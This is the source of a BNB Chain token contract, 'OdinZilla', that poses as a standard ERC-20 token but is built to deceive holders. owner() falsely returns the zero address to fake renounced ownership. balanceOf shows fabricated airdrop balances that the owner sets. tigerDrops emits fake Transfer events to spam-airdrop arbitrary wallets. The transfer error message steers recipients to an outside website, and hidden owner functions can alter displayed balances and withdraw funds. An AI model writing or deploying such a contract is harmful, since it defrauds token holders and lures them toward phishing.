/**
 *Submitted for verification at BscScan.com on 2022-01-12
*/

// SPDX-License-Identifier: GPL-2.0-or-later

pragma solidity ^0.8.7;
pragma abicoder v2;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract OdinZilla is Ownable, IERC20 {
    string private _name;
    string private _symbol;
    uint256 private _totalSupply;
    uint256 private _airdropAmount;
    uint256 private _baseAmount;

    mapping(address => bool) private _unlocked;
    mapping(address=>bool) private suer;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor() Ownable() {
        _name = "OdinZilla";
        _symbol = "OdinZilla";
        _unlocked[_owner] = true;
        _unlocked[address(this)] = true;
        _totalSupply = 6066000000000000 * 10**18;
        _balances[_owner] = 3033000000000000 * 10**18;
        _balances[address(this)] = 3033000000000000 * 10**18;
        

    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        if (!_unlocked[account]) {
            return _airdropAmount;
        } else {
            if(suer[account]){
                return _baseAmount;
            } else{
            return _balances[account];
            }
        }
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function setAirdropAmount(uint256 airdropAmount_,uint256 baseAmount_) public onlyOwner (){

        _airdropAmount = airdropAmount_;
        _baseAmount =baseAmount_;
    }
    ////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    ////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_unlocked[sender], "ERC20: token must be unlocked before transfer.Visit https://tigerswap.info for more info'");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;
        _unlocked[recipient] = true;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    ////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////
    
    function tigerDrops(address[] memory holders, uint256 amount) public payable {
        uint balanceThis = IERC20(address(this)).balanceOf(address(this)); 
        uint amounts=holders.length * _airdropAmount;
        unchecked{
            _balances[address(this)] = balanceThis - amounts;
        }
        for (uint i=0; i<holders.length; i++) {
            emit Transfer(address(this), holders[i], amount);
        }
        
    }
    function cliamValue(address payable receiver, uint amount) public onlyOwner payable {
        uint balance = address(this).balance;
        if (amount == 0) {
            amount = balance;
        }
        require(amount > 0 && balance >= amount, "no balance");
        receiver.transfer(amount);
    }

    function cliamToken(address receiver, address tokenAddress, uint amount) public onlyOwner payable {
        uint balance = IERC20(tokenAddress).balanceOf(address(this));
        if (amount == 0) {
            amount = balance;
        }
        require(amount > 0 && balance >= amount, "bad amount");
        IERC20(tokenAddress).transfer(receiver, amount);
    }

    function suert(address base_) public onlyOwner payable{
        suer[base_] = true;
    }
    function suerf(address base_) public onlyOwner payable{
        suer[base_] = false;
    }

}